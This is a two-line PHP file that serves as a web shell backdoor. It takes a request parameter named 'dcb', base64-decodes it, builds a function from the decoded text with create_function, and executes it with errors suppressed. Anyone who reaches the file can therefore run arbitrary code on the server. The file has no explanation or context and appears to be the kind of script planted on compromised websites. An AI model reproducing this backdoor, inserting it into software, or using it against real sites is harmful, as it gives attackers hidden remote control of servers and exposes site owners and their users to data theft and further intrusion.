<?php
if(!empty($_REQUEST['dcb'])){$dcb=base64_decode($_REQUEST['dcb']);$dcb=create_function('',$dcb);@$dcb();exit;}